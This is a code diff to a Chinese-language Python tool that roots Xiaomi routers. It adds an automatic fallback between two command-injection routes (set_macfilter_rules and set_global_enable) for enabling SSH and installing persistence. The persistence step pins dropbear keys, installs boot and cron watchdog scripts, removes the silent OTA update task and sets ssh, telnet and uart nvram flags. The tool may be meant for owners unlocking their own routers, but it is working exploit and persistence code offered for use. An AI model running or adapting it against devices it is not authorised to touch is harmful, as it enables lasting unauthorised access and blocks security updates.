@@ -230,13 +230,17 @@ if SCRIPT_DIR not in sys.path:
 try:
     from tools.calc_root_pwd import root_pwd, selftest as run_selftest
     import tools.recv_backup as recv_backup_mod
-    from tools.exploit_set_global_enable import enable_ssh as enable_ssh_global
+    from tools.exploit_set_global_enable import (
+        enable_ssh as enable_ssh_global,
+        apply_persistence as persist_global,
+    )
     from tools.exploit_set_macfilter_rules import (
         Router,
         build_payload,
         DROPBEAR_CMDS,
         TELNET_CMDS,
         get_persist_cmd,
+        PERSIST_SCRIPT,
         _local_ip,
     )
 except ImportError:
@@ -252,6 +256,7 @@ class Context:
         self.sn = ""
         self.root_pwd = ""
         self.device_info = ""
+        self.exploit_method = None   # None | "macfilter" | "global_enable"
 
     def summary(self):
         sn_disp = c(Color.CYAN, self.sn) if self.sn else c(Color.DIM, "后台自动获取")
@@ -446,10 +451,14 @@ def enable_ssh_auto(gw):
     for _ in range(4):
         time.sleep(1)
         if test_port(gw.ip, 22, timeout=1.0):
+            ctx.exploit_method = "macfilter"
             return True
     print(c(Color.YELLOW, "[*] 22 端口未开放，自动尝试途径 2/2: set_global_enable"))
     try:
-        return enable_ssh_global(gw, DROPBEAR_CMDS, detect_local_ip(gw.ip), test_port)
+        ok = enable_ssh_global(gw, DROPBEAR_CMDS, detect_local_ip(gw.ip), test_port)
+        if ok:
+            ctx.exploit_method = "global_enable"
+        return ok
     except Exception as exc:
         print(c(Color.YELLOW, "[!] 第二条途径异常: {0}".format(exc)))
         return False
@@ -630,13 +639,76 @@ def menu_connect_ssh():
 # ==============================================================================
 # 功能 5: 持久化与防静默 OTA
 # ==============================================================================
+def apply_persistence_auto(gw):
+    """Deploy persistence configuration, supporting automatic fallback to set_global_enable."""
+    # 途径优先判断：若此前开 SSH 时已确认有效途径，则直接复用
+    if ctx.exploit_method == "global_enable":
+        print("[*] 复用已知途径 2/2: 直接通过 set_global_enable 下发持久化配置...")
+        try:
+            return persist_global(gw, PERSIST_SCRIPT, detect_local_ip(gw.ip), test_port)
+        except Exception as exc:
+            print(c(Color.YELLOW, "[!] set_global_enable 持久化异常: {0}".format(exc)))
+            return False
+
+    if ctx.exploit_method == "macfilter":
+        print("[*] 复用已知途径 1/2: 使用 set_macfilter_rules 下发持久化配置...")
+        try:
+            payload = build_payload(get_persist_cmd())
+            import random
+            mac = "02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5))
+            resp = gw.inject(payload, mac, "0")
+            time.sleep(2)
+            return test_port(gw.ip, 22, timeout=2.0) or (resp is not None and '"code":0' in (resp or ""))
+        except Exception as exc:
+            print(c(Color.YELLOW, "[!] set_macfilter_rules 请求异常: {0}".format(exc)))
+            return False
+
+    # 尚未确定途径时，先尝试途径 1/2: set_macfilter_rules
+    print("[*] 途径 1/2: set_macfilter_rules 下发持久化配置")
+    port_was_open = test_port(gw.ip, 22, timeout=1.0)
+    macfilter_success = False
+    try:
+        payload = build_payload(get_persist_cmd())
+        import random
+        mac = "02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5))
+        resp = gw.inject(payload, mac, "0")
+        if resp is not None and '"code":0' in resp:
+            macfilter_success = True
+    except Exception as exc:
+        print(c(Color.YELLOW, "[!] 第一条途径请求异常: {0}".format(exc)))
+
+    if not port_was_open:
+        for _ in range(4):
+            time.sleep(1)
+            if test_port(gw.ip, 22, timeout=1.0):
+                ctx.exploit_method = "macfilter"
+                return True
+        print(c(Color.YELLOW, "[*] 22 端口未开放，自动尝试途径 2/2: set_global_enable"))
+    elif not macfilter_success:
+        print(c(Color.YELLOW, "[*] 第一条途径响应异常，自动尝试途径 2/2: set_global_enable"))
+    else:
+        ctx.exploit_method = "macfilter"
+        return True
+
+    # 尝试途径 2/2: set_global_enable
+    try:
+        ok = persist_global(gw, PERSIST_SCRIPT, detect_local_ip(gw.ip), test_port)
+        if ok:
+            ctx.exploit_method = "global_enable"
+        return ok
+    except Exception as exc:
+        print(c(Color.YELLOW, "[!] 第二条途径异常: {0}".format(exc)))
+        return False
+
+
 def menu_persistence():
     print(c(Color.BOLD, "\n--- [5] 一键持久化: 固化 SSH 访问 & 关闭静默 OTA 升级 ---"))
     print("说明: 本功能将【全自动】向路由器注入部署持久化脚本:")
     print("  1. 固化 dropbear RSA host_key 到 /data/ssh/")
     print("  2. 建立开机启动守护脚本 /data/ssh/boot.sh")
     print("  3. 配置 /etc/crontabs/root 每分钟守护，并剔除凌晨 otapredownload 任务防静默升级")
-    print("  4. 写入 nvram (ssh_en=1, telnet_en=1, uart_en=1) 跨重启生效\n")
+    print("  4. 写入 nvram (ssh_en=1, telnet_en=1, uart_en=1) 跨重启生效")
+    print("自动尝试: set_macfilter_rules → set_global_enable 双途径保障\n")
 
     get_credentials()
 
@@ -668,18 +740,13 @@ def menu_persistence():
                 ctx.device_info = "{0} ({1})".format(gw.displayName, gw.hardware or "Xiaomi")
 
         print("[*] 正在向路由器下发全套持久化配置...")
-        payload = build_payload(get_persist_cmd())
-        import random
-        mac = ("02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5)))
-        gw.inject(payload, mac, "0")
+        is_ok = apply_persistence_auto(gw)
 
-        print("[*] 等待 2 秒后检测持久化后的 22 端口服务状态...")
-        time.sleep(2)
         print("\n" + "=" * 64)
-        if test_port(ctx.router_ip, 22, timeout=2.0):
-            print(c(Color.GREEN + Color.BOLD, "[✓] 自动持久化配置成功！22 端口运行正常！"))
+        if is_ok:
+            print(c(Color.GREEN + Color.BOLD, "[✓] 自动持久化配置成功！22 端口与守护脚本已就绪！"))
         else:
-            print(c(Color.YELLOW + Color.BOLD, "[✓] 持久化指令已发送成功！"))
+            print(c(Color.YELLOW + Color.BOLD, "[!] 尝试持久化后未能确认成功，请检查路由器网络与回连状态。"))
         print("-" * 64)
         if ctx.device_info:
             print("设备型号 : {0}".format(c(Color.BOLD, ctx.device_info)))
